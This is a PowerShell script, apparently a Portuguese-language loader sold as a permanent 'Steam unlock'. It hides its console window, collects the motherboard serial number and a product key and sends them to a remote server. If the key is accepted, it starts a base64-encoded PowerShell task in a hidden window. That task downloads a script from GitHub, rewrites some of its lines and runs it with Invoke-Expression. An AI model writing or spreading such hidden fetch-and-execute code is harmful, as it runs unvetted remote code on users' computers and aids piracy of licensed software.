# 1. Oculta a janela inicial (Console)
$showWindow = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
$type = Add-Type -MemberDefinition $showWindow -Name "Win32ShowWindow" -Namespace "Win32" -PassThru
$type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName Microsoft.VisualBasic, System.Windows.Forms

# Captura HWID e Key
$hwid = (Get-CimInstance Win32_BaseBoard).SerialNumber.Trim()
$key = [Microsoft.VisualBasic.Interaction]::InputBox("Insira sua chave do produto:", "ATIVAR STEAM DESBLOQUEADA", "")

if (-not $key) { exit }

try {
    $url = "https://waedqlfiprmsdkwhjkea.supabase.co/functions/v1/smooth-worker"
    $body = @{ key = $key; hwid = $hwid } | ConvertTo-Json
    $auth = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" -UserAgent "Mozilla/5.0"

    if ($auth.status -eq "authorized") {

        [System.Windows.Forms.MessageBox]::Show("STEAM DESBLOQUEADA ATIVADA PERMANENTEMENTE`n(Qualquer erro ative novamente com a mesma chave)`n`nO download iniciou e pode levar cerca de 1 a 2 minutos. Aguarde.", "Sucesso")

        $bgTask = @'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

try {
    $rawScript = Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/VenezzaX/SteamFunDependencies/refs/heads/main/steampro.ps1'

    # ✅ \ simples — here-string de aspas simples é 100% literal
    $linhas = $rawScript -split '\r?\n'
    $scriptLimpo = @()

    foreach ($linha in $linhas) {

        if ($linha -match 'ReadKey') {
            $scriptLimpo += 'Start-Sleep -Seconds 2'
            continue
        }

        if ($linha -match 'KeyAvailable') {
            $scriptLimpo += 'if ($false) {'
            continue
        }

        # ✅ \s*= com \ simples
        if ($linha -match 'milleniumTimer\s*=') {
            $scriptLimpo += '$milleniumTimer = 0'
            continue
        }

        $scriptLimpo += $linha
    }

    $s = $scriptLimpo -join "`n"

    Invoke-Expression $s

    $wUrl = 'https://raw.githubusercontent.com/RicoSteam/SteamMethod/refs/heads/main/warning.txt'
    $path = "$env:TEMP\warning.txt"
    (New-Object System.Net.WebClient).DownloadFile($wUrl, $path)
    Start-Process notepad.exe $path

} catch {}
'@

        $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($bgTask))

        Start-Process powershell.exe -ArgumentList "-NoProfile", "-WindowStyle Hidden", "-EncodedCommand", $encoded -WindowStyle Hidden

        exit

    } else {
        [System.Windows.Forms.MessageBox]::Show("Chave inválida ou já vinculada a outro computador.", "Acesso Negado")
    }
} catch {
    [System.Windows.Forms.MessageBox]::Show("Erro ao validar: Verifique sua chave ou network.`n`nDetalhe: $($_.Exception.Message)", "Erro")
}
